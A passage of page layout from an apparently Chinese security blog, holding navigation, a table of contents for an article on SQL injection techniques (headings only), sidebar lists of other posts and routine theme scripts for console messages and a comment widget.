class="label">上一篇</div><div class="prev_info">PentesterLab刷题记录</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/19/chang-jian-shen-tou-ce-shi-liu-cheng/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见渗透测试流程</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/ajax-xiang-jie/" title="Ajax详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-07-27</div><div class="title">Ajax详解</div></div></a></div><div><a href="/2023/11/12/flask-pin-ma-xue-xi/" title="Flask-PIN码学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-12</div><div class="title">Flask-PIN码学习</div></div></a></div><div><a href="/2023/08/06/docker-jian-jie/" title="docker基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-08-06</div><div class="title">docker基础</div></div></a></div><div><a href="/2024/02/27/jwt-gong-ji-xue-xi/" title="JWT攻击学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-27</div><div class="title">JWT攻击学习</div></div></a></div><div><a href="/2024/04/09/php-opcachegetshell/" title="PHP-OPcacheGetshell学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-09</div><div class="title">PHP-OPcacheGetshell学习</div></div></a></div><div><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/" title="Phar反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-13</div><div class="title">Phar反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-rand%E5%92%8Corder-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">0x02 rand和order by报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#floor%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Floor（）函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-exp%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x03 EXP函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">3.1.</span> <span class="toc-text">注出数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">Insert位置注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">Update位置注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">exp() 函数进行盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2021-%E8%99%8E%E7%AC%A6%E6%9D%AF-ctf-finalweb-hatenum"><span class="toc-number">3.4.1.</span> <span class="toc-text">2021 虎符杯 CTF Finalweb Hatenum</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-regexp%E4%B8%8Elike%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 REGEXP与LIKE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#regexp%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">REGEXP注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.</span> <span class="toc-text">1、基本注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-regexp%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.2.</span> <span class="toc-text">2、REGEXP盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#like%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">LIKE注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.1.</span> <span class="toc-text">1、基本注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-like%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">2、LIKE盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-regexp%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="toc-number">4.2.3.</span> <span class="toc-text">3、REGEXP注入实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bjdctf-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">BJDCTF 2nd 简单注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%90%8E%E8%A8%80"><span class="toc-number">5.</span> <span class="toc-text">0x05 后言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">0x06 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
